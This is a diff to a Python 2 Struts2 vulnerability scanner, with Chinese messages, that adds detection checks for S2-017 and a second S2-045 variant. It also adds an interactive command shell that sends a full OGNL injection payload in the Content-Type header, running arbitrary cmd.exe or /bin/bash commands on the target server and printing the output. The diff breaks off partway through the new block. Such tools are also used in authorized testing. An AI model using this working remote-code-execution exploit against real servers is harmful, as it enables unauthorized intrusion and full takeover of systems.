@@ -147,6 +147,17 @@ class struts_baseverify:
             print "超时原因: ", e
 
         try:
+            req = requests.get(self.url+'/?redirect:https://www.baidu.com/%23', timeout=TMOUT, verify=False)
+            if req.status_code == 302:
+                cprint("目标存在struts2-017漏洞..(只提供检测)", "red")
+                filecontent.writelines("struts2-017 success!!!\n")
+            else:
+                cprint("目标不存在struts2-017漏洞..", "green")
+        except Exception as e:
+            cprint("检测struts2-017超时..", "cyan")
+            print "超时原因: ", e
+
+        try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-019'], timeout=TMOUT, verify=False)
             self.check("struts2-019", req.text)
         except Exception as e:
@@ -186,6 +197,21 @@ class struts_baseverify:
             self.check("struts2-045", req.text)
         except Exception as e:
             cprint("检测struts2-045超时..", "cyan")
+            print "超时原因: ", e
+
+        try:
+            headers045 = {
+                'Content-Type':'${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("testvuln",1234*1234)}.multipart/form-data',
+            }
+            req = requests.get(self.url, headers=headers045, timeout=TMOUT, verify=False)
+            try:
+                if r"1522756" in req.headers['testvuln']:
+                    cprint("目标存在struts2-045-2漏洞..", "red")
+                    filecontent.writelines("struts2-045-2 success!!!\n")
+            except:
+                pass
+        except Exception as e:
+            cprint("检测struts2-045-2超时..", "cyan")
             print "超时原因: ", e
 
         try:
@@ -458,6 +484,25 @@ class struts_baseverify:
                          "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                          "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                          "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+                         }
+                    try:
+                        req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
+                        print req.text
+                    except:
+                        cprint("命令执行失败!!!", "red")
+                else:
+                    sys.exit(1)
+
+        if pocname == "struts2-045-2":
+            while True:
+                print prompt,
+                command = raw_input()
+                command = command.strip()
+                if command != "exit":
+                    headers_exp = {
+                         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+                         "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
+                         "Content-Type":"%{(#dm='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                          }
                     try:
                         req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
